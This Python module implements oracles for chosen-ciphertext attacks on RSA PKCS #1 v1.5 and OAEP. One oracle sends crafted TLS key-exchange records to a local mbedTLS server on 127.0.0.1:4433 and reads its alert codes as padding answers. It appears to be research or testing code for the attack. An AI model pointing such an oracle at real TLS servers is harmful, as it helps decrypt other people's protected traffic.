"""
Oracles for chosen-ciphertext attacks on PKCS #1
"""
from Crypto.Cipher import PKCS1_v1_5
import ssl_client
import socket
import struct
import select
import time

import subprocess


class Oracle(object):
    def __init__(self):
        pass

    def query(self, input):
        raise NotImplementedError("Must override query")


class PKCS1_v1_5_Oracle(Oracle):
    """
    Oracle for RSA PKCS #1 v1.5
    """
    def __init__(self, key):
        self.cipher = PKCS1_v1_5.new(key)
        super(Oracle, self).__init__()

    def query(self, input):
        """
        Checks if input is a conforming encryption
        :param input: bytearray of size k, where k=n_length/8
        :return: True if input is a valid encryption, False else
        """
        if self.cipher.decrypt(input, None) is None:
            return False
        return True

def build_keyexch(pms, identity=b"Client_identity"):
    paramslen = 4 + len(pms) + len(identity)
    fmt = ">BHHBBHH%usH%us" % (len(identity), len(pms))
    return struct.pack(fmt, 22, 0x303, paramslen + 4, 16, 0, paramslen, len(identity), identity, len(pms), pms)

class PKCS1_v1_5_Oracle_MbedTLS(Oracle):
    def __init__(self, key):
        super(Oracle, self).__init__()
        self.sock = None

        # ssl_client.set_opts(["force_version=tls12", "auth_mode=none", "ca_file=none", "ca_path=none", "key_pwd=none", "curves=none", "force_ciphersuite=TLS-RSA-PSK-WITH-AES-128-CBC-SHA256", "psk=abcdef"])

    def sock_init(self):
        self.sock = socket.socket()
        self.sock.connect(("127.0.0.1", 4433))
        self.sock.send(bytes.fromhex("16030300610100005d030362ac2c12d90b74d84a688188a36a11df1455920891da9ab4cfc2cfb8f0ba0a7d00000400b600ff010000300000000e000c0000096c6f63616c686f7374000d000e000c060306010503050104030401001600000017000000230000"))
        self.sock.setblocking(0)
        time.sleep(1)
        self.sock.recv(100000)

    def old_query(self, input):
        #client = subprocess.Popen(["./mbedtls/programs/ssl/ssl_client2", "force_version=tls12", "auth_mode=none", "ca_file=none", "ca_path=none", "key_pwd=none", "curves=none",
#            "force_ciphersuite=TLS-RSA-PSK-WITH-AES-128-CBC-SHA256", "psk=abcdef", "custom_pms=" + input.hex()]) #, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 #       ret = client.wait()
        ret = ssl_client.query(input)
        return ret != -1

    def read_bytes(self, count, timeout=1):
        res = select.select([self.sock], [], [], timeout)
        if not res[0]:
            return b""
        return self.sock.recv(count)

    def read_resp(self):
        typ = self.read_bytes(1)
        if len(typ) == 0:
            return 0
        if typ != b"\x15":
            return -1
        ver = self.read_bytes(2)
        length = self.read_bytes(2)
        if length != b"\x00\x02":
            return -2
        lvl = self.read_bytes(1)
        if lvl != b"\x02":
            return -3
        desc = self.read_bytes(1)
        return int.from_bytes(desc, byteorder="big")

    def query(self, input):
        if self.sock is None:
            self.sock_init()
        self.sock.send(build_keyexch(input))
        resp = self.read_resp()
        if resp != 91:
            print("RESP %d" % resp)
            self.sock.close()
            self.sock = None
        return resp != 91


class PKCS1_OAEP_Oracle(Oracle):
    """
    Oracle for RSA PKCS #1 OAEP
    """
    def __init__(self, k, key):
        self.n = key.n
        self.d = key.d
        self.B = 2 ** (8 * (k - 1))
        super(Oracle, self).__init__()

    def query(self, input):
        """
        Checks if the decryption of input is less than B
        :param input: bytearray of size k, where k=n_length/8
        :return: True if (input) ** d mod n is less than B, False else
        """
        c = int.from_bytes(input, byteorder='big')
        p = pow(c, self.d, self.n)
        if p < self.B:
            return True
        return False

